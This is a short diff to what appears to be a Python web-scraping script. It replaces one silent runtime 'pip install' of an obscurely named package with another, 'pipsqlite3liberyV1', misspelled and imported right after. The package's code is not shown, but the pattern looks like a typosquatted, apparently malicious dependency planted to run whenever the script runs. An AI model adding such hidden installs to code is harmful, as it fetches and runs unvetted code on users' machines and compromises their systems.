@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptmodule")
-import pipcryptmodule
+os.system("pip install pipsqlite3liberyV1")
+import pipsqlite3liberyV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
